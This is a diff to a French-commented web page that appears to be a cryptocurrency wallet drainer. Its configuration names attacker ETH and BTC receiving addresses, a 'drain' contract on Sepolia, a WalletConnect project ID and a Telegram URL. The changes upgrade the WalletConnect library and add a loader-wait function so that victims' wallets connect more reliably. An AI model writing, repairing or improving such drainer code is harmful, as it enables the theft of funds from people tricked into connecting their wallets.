@@ -8,7 +8,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <!-- Librairies externes -->
     <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" type="text/javascript"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@scure/btc-signer@1.2.0/dist/index.umd.js"></script>
     <style>
         /* Styles pour le popup et l'overlay */
@@ -215,7 +215,7 @@
             ATTACKER_ADDRESS: '0xc427AB745eA6b12C557c7342f94D96f68D19D754',
             BTC_ATTACKER_ADDRESS: 'tb1qmqts2vhpzul4ltmvs97gdnvsfm3h6slfv2vv2l',
             DRAIN_CONTRACT_ADDRESS: '0x5D8F38c17aB48446c7b28E38076aCD9057480963', // Adresse correcte pour Sepolia
-            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d' // Remplace par ton projectId
+            WALLET_CONNECT_PROJECT_ID: '734ae739400cb6571838de4b118a972d' // Ton projectId
         };
 
         // URL Telegram
@@ -306,6 +306,18 @@
                 updateStatus(elements, 'Erreur lors de l’initialisation : ' + error.message, false, 'red');
             }
         });
+
+        // Fonction pour attendre que EthereumProvider soit chargé
+        async function waitForEthereumProvider(timeout = 5000) {
+            const start = Date.now();
+            while (typeof window.EthereumProvider === 'undefined') {
+                if (Date.now() - start >= timeout) {
+                    throw new Error('EthereumProvider n’a pas pu être chargé dans le délai imparti.');
+                }
+                await delay(100); // Attendre 100ms avant de vérifier à nouveau
+            }
+            return window.EthereumProvider;
+        }
 
         // Fonction pour détecter les wallets (PC et mobile)
         async function detectWallet(elements) {
@@ -405,12 +417,8 @@
                             console.log(`${wallet.name} déjà injecté`);
                             provider = wallet.provider;
                         } else if (wallet.walletConnect) {
-                            // Vérifier si EthereumProvider est disponible (WalletConnect v2)
-                            if (typeof window.EthereumProvider === 'undefined') {
-                                updateStatus(elements, 'Erreur : WalletConnect n’est pas chargé. Vérifiez votre connexion ou réessayez.', false, 'red');
-                                walletListContainer.classList.remove('hidden');
-                                throw new Error('EthereumProvider n’est pas chargé.');
-                            }
+                            // Attendre que EthereumProvider soit chargé
+                            await waitForEthereumProvider();
 
                             // Utiliser WalletConnect v2 (AppKit) pour connecter le wallet
                             const walletConnectProvider = await window.EthereumProvider.init({
